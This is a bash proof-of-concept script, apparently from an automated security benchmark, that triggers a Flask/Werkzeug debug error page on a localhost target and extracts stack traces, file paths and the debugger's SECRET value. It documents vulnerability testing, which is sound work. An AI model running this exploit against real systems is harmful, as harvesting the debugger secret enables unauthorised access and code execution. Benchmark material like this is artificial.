#!/bin/bash
# POC: Demonstrates Flask Debug Mode Information Disclosure by sending a malformed POST request that triggers an error and exposes Werkzeug debugger page with stack traces, file paths, and SECRET variable
# Target: ./repo
# Created: 2025-12-01T16:00:30.128Z
# Session: benchmark-XBEN-094-24-minbx06k

# Flask Debug Mode Information Disclosure POC
# This script demonstrates the vulnerability by sending a malformed POST request
# to trigger an error and capture the Werkzeug debugger response

TARGET_URL="${1:-http://localhost:5003}"
ENDPOINT="/add_url"
OUTPUT_FILE="debug_response.html"

echo "[*] Flask Debug Mode Information Disclosure POC"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Send malformed JSON POST request (missing 'url' parameter)
echo "[*] Sending malformed JSON POST request..."
curl -v -X POST \
  -H "Content-Type: application/json" \
  -d '{"noturl": "test"}' \
  "$TARGET_URL$ENDPOINT" \
  -o "$OUTPUT_FILE" \
  2>&1 | grep -E "HTTP|Content-Type"

echo ""
echo "[*] Response saved to: $OUTPUT_FILE"
echo ""

# Check if Werkzeug debugger page is present
if grep -q "Werkzeug Debugger" "$OUTPUT_FILE" 2>/dev/null; then
    echo "[+] VULNERABLE: Werkzeug Debugger page detected!"
    echo ""
    
    # Extract key vulnerability indicators
    echo "[+] Vulnerability Evidence Found:"
    echo ""
    
    # Check for stack traces
    if grep -q "Traceback" "$OUTPUT_FILE"; then
        echo "  [✓] Stack traces exposed"
    fi
    
    # Check for file paths
    if grep -q "/home/daytona/.local/lib/python" "$OUTPUT_FILE" || grep -q "\.py" "$OUTPUT_FILE"; then
        echo "  [✓] File paths exposed"
        grep -o "/home/[^\"]*\.py" "$OUTPUT_FILE" | head -5 | sed 's/^/      /'
    fi
    
    # Check for source code
    if grep -q "<code>" "$OUTPUT_FILE"; then
        echo "  [✓] Source code snippets exposed"
    fi
    
    # Check for SECRET variable
    if grep -q "SECRET = " "$OUTPUT_FILE"; then
        echo "  [✓] SECRET variable exposed in JavaScript"
        SECRET_VALUE=$(grep -oP "SECRET = \K[^'\"]*" "$OUTPUT_FILE" | head -1)
        if [ -n "$SECRET_VALUE" ]; then
            echo "      SECRET: $SECRET_VALUE"
        fi
    fi
    
    # Check for frame variables
    if grep -q "console_frame" "$OUTPUT_FILE" || grep -q "interactive debugger" "$OUTPUT_FILE"; then
        echo "  [✓] Interactive debugger console available"
    fi
    
    echo ""
    echo "[+] Vulnerability confirmed: Flask debug mode is enabled!"
    
else
    echo "[-] Werkzeug Debugger page not detected"
    echo "[*] Response status: $(head -1 "$OUTPUT_FILE" | grep -oE '[0-9]{3}')"
    echo "[*] Check $OUTPUT_FILE for details"
fi